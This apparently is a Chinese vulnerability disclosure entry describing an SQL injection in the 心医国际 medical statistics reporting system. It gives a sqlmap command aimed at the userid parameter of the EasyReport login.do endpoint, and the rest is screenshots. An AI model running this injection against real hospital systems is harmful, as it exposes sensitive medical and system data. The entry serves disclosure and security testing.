# 心医国际医技统计报表系统存在SQL注入漏洞

**<font style="color:rgb(38, 38, 38);">一、漏洞简介</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际是中国专业的医疗云应用解决方案提供商，铺建并运营全国领先的智能医疗云平台，依托十年的数据积累和业务实践，持续创新智能医疗场景应用。业务服务覆盖诊疗、教学、科研、管理等多维度，助力政府、医院及产业合作伙伴，打造线上线下高效协同的智慧医疗健康服务体系，目前已建成覆盖全国31个省，联结2万余家医疗机构的智能医疗云平台，助力建设并服务青海、河南、陕西、山西、贵州、新疆、江西、广西、甘肃9大省级远程医疗平台，服务通达80%全国三甲级医院;成功建设并服务全国300余个省、市、县及专科医联体。心心医国际医技统计报表系统存在SQL注入漏洞，攻击者可通过该漏洞获取系统敏感信息  
</font>**<font style="color:rgb(38, 38, 38);">二、影响版本</font>**<font style="color:rgb(38, 38, 38);">  
</font><font style="color:rgb(38, 38, 38);">心医国际医技统计报表</font>![1714374819079-557cb0bb-eb99-43fd-bdbe-e10c186b405f.png](./img/S4nzAYLJAV3ALS5_/1714374819079-557cb0bb-eb99-43fd-bdbe-e10c186b405f-912662.png)<font style="color:rgb(38, 38, 38);">  
</font>**<font style="color:rgb(38, 38, 38);">三、漏洞复现</font>**

```plain
python3 sqlmap.py -u "http://127.0.0.1/EasyReport/login.do?method=handleRequestRole&t=731&userid=admin&_=1714374538731" -p userid
```

![1714374865701-7324443d-3be6-4063-ad61-a052c6b455ee.png](./img/S4nzAYLJAV3ALS5_/1714374865701-7324443d-3be6-4063-ad61-a052c6b455ee-234969.png)





> 更新: 2024-06-17 09:27:35  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/cvggxfx71i5i1y2x>